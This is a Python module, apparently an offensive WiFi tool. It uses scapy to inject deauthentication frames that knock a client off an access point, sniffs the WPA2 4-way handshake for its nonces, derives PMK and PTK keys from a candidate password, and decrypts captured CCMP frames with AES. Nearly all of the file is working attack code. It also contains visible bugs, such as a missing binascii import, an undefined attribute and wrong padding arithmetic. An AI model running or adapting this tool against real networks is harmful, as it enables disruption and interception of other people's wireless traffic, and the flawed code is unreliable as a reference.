#capture module
import threading
import os
import time
import random
from scapy.all import *
import hmac
from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac, sha1, md5
from Crypto.Cipher import AES
import struct


class WPA2:
    def __init__(self, apMac, staMac, aNonce, sNonce, ssid):
        self.apMac = apMac
        self.staMac = staMac
        self.aNonce = aNonce
        self.sNonce = sNonce
        self.ssid = ssid
    
    def apMac(self):
        return self.apMac
    
    def staMac(self):
        return self.staMac
    
    def aNonce(self):
        return self.aNonce
    
    def sNonce(self):
        return self.sNonce
    
    def ssid(self):
        return self.ssid
    

class capturemodule():
    
    F_nonces = []
    
    def deauth(self, staMac, apMac, iface):
        dot11 = Dot11(addr1=staMac, addr2=apMac, addr3=apMac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        sendp(packet, count=1, iface=iface, verbose=1)

    def getnonce(self, pkt) :
        if pkt.haslayer(EAPOL) and pkt.getlayer(EAPOL).type == 3 :
            eapol = pkt.getlayer(EAPOL)
            self.F_nonces.append(bytes(eapol)[0x11:0x11 + 0x20])
        
    def capture4way(self, staMac, apMac, iface, ch, sec) :
        try:
            thread = threading.Thread(target = self.deauth, args=(staMac, apMac, iface, ))
            thread.daemon = True
            thread.start()
            
            os.system('iwconfig %s channel %d' % (iface, ch))
            sniff(iface=iface, prn=self.getnonce, timeout=sec)
        
        except Exception as e: # False Case 1 [Hopper or Sniff Failed]
            print(" [*] Error : ", e)
            return False

        finally:
            self.stop_hopper = True
        
    # F_nonces[0], F_nonces[1] = aNonce, sNonce
    
    def PRF(self, key, A, B):
        # Number of bytes in the PTK
        nByte = 64
        i = 0
        R = b''
        # Each iteration produces 160-bit value and 512 bits are required
        while (i <= ((nByte * 8 + 159) / 160)):
            hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
            R = R + hmacsha1.digest()
            i += 1
        return R[0:nByte]


    def MakeAB(self, aNonce, sNonce, apMac, cliMac):
        A = b"Pairwise key expansion"
        B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
        return (A, B)


    def makePMK(self, pwd, ssid):
        pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
        return pmk


    def makePTK(self, pmk, A, B):
        ptk = self.PRF(pmk, A, B)
        return ptk

class WPA2DecryptionBox:
    def __init__(self, pkt, tk_key):
        self.pkt = pkt
        self.tk_key = tk_key
        self.TA = binascii.a2b_hex(self.pkt.getlayer(Dot11).addr2.replace(':', ''))
        self.PN = self.make_PN()

    def make_PN(self):
        CCMP_header = bytes(self.pkt.getlayer(Dot11CCMP))
        PN = (CCMP_header[0:2] + CCMP_header[4:8])[::-1]
        # print(b'debug : ' + PN)
        return PN

    def make_CTR_PRELOAD(self, idx):
        Flag = b'\x01'
        Qos_TC = b'\x00'
        TA = self.TA
        PN = self.PN
        counter = struct.pack('>h', idx + 1)
        return Flag + Qos_TC + TA + PN + counter

    def decrypt_AES_CTR(self):
        plaintext = b''
        ciphertext = bytes(self.pkt.getlayer(Dot11Encrypted))
        ciphertext = ciphertext[:-8]  # exclude MIC
        ciphertext += b'\x00' * (len(ciphertext) % 16)
        block_len = len(ciphertext) // 16

        cipher = AES.new(self.tk_key, AES.MODE_ECB)
        for idx in range(block_len):
            xordata = cipher.encrypt(self.make_CTR_PRELOAD(idx))
            for i, j in zip(xordata, ciphertext[16 * idx: 16 * (idx + 1)]):
                plaintext += bytes([i ^ j])

        return plaintext

    def save_packet(self):
        try:
            plaintext = self.decrypt_AES_CTR()
        except Exception as e:
            print(" [*] Error : ", e)

        print("result : ", plaintext)
        with open('result.pcap', 'wb') as f:
            f.write(plaintext)
        print("[+] Save Packet Done!")


'''if __name__ == '__main__':
    sample = PcapReader("/home/hunjison/Desktop/CRGWiFi/wpa-Induction.pcap")
    pkt_list = sample.read_all()
    tk_key = b'\x00' * 16

    idx = 0
    for idx in range(len(pkt_list)):
        pkt = pkt_list[idx]
        if pkt.getlayer(Dot11CCMP):
            if pkt.getlayer(Dot11).type == 2:
                # print("pkt select done! : number = ", idx)
                wpa2decryptionbox = WPA2DecryptionBox(pkt, tk_key)

                break

    wpa2decryptionbox.save_packet()
    print('done!')'''